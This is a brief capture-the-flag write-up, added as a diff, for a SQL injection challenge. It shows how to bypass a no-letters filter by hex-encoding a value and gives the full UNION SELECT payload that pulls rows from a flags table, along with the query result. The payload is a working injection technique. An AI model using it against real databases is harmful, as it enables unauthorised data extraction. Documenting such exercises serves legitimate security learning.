@@ -1,0 +1,23 @@
+This task is pretty hard to understand. 
+
+Initially there is a request:
+SELECT * FROM age WHERE age
+
+And there is the task:
+Find out how many years you have left to live
+There is flags table with columns id, name and flag. Real flag has name 7e6d83ade8bcbea8.
+
+We cant input letters in our inject. 
+So we need to transform it. 
+The way to solve is to use HEX encoding like this:
+7e6d83ade8bcbea8 -> 37653664383361646538626362656138
+When we using hex, we need to add prefix: "0x"
+
+So the RQ will be like:
+SELECT * FROM age WHERE age=123 union select id,name,flag from flags where name = 0x37653664383361646538626362656138
+
+Result:
+id	age	                death
+124	123	                  14
+598	7e6d83ade8bcbea8	spbctf{do it urself}
+------------------------------------------
